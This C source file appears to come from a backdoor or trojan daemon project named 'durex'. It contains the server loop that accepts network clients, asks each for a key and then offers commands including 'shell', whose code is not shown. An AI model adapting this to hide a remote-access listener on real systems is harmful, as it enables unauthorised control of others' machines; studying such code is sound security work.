#include "../../include/durex.h"

void 	set_fd(t_deamon *durex)
{
	FD_ZERO(&durex->fd_read);
	for (int i = 0; i < MAX_CLIENTS; ++i)
		if (durex->clients[i].fd != -1)
			FD_SET(durex->clients[i].fd, &durex->fd_read);
	FD_SET(durex->sockfd, &durex->fd_read);
}

void	add_client(t_deamon *durex)
{
	int new_fd = -1;
	struct sockaddr_in cli = {0};
	socklen_t len = sizeof(cli);

	new_fd = accept(durex->sockfd, (struct sockaddr *)&cli, &len);
	if (durex->connected_clients < MAX_CLIENTS)
	{
		for (int i = 0; i < MAX_CLIENTS; ++i)
		{
			if (durex->clients[i].fd == -1)
			{
				durex->clients[i].fd = new_fd;
				durex->connected_clients++;
				send(durex->clients[i].fd, "\nKey: ", 6, 0);
				break ;
			}
		}
	}
	else
	{
		send(new_fd, "Maximum capacity reached\n", 25, 0);
		close(new_fd);
	}
}

void 	remove_client(t_deamon *durex, int index)
{
	close(durex->clients[index].fd);
	durex->clients[index].fd = -1;
	durex->connected_clients--;
	bzero(durex->clients[index].read_buffer, MAX_BUFF);
	bzero(durex->clients[index].write_buffer, MAX_BUFF);
	bzero(durex->clients[index].log, MAX_BUFF);
	durex->clients[index].auth = false;
}

void 	msg_from_client(t_deamon *durex, int index, char **env)
{
	char *msg = durex->clients[index].read_buffer;

	if (!memcmp(msg, "shell\n", 6))
		cmd_shell(durex, index, env);
	else if (!memcmp(msg, "help\n", 5))
		cmd_help(durex, index);
	else if (!memcmp(msg, "io\n", 3))
		cmd_io(durex, index);
	else if (!memcmp(msg, "log\n", 4))
		cmd_log(durex, index);
	else if (!memcmp(msg, "exit\n", 5))
		remove_client(durex, index);
	else
		cmd_help(durex, index);
	msg_to_client(durex);
}

void 	server_loop(t_deamon *durex, char **env)
{
	while (1)
	{
		int ret = 0;
		set_fd(durex);
		durex->fd_write = durex->fd_read;
		select(FD_SETSIZE, &durex->fd_read, &durex->fd_write, 0, 0);

		if (FD_ISSET(durex->sockfd, &durex->fd_read))
			add_client(durex);
		for (int i = 0; i < MAX_CLIENTS; ++i)
		{
			if (FD_ISSET(durex->clients[i].fd, &durex->fd_read))
			{
				ret = recv(durex->clients[i].fd, durex->clients[i].read_buffer, MAX_BUFF, 0);
				if (ret == 0)
					remove_client(durex, i);
				else if (ret > 0)
				{
					if (durex->clients[i].auth == true)
						msg_from_client(durex, i, env);
					else
						cmd_key(durex, i);
				}
			}
			durex->io_data += ret;
		}
	}
}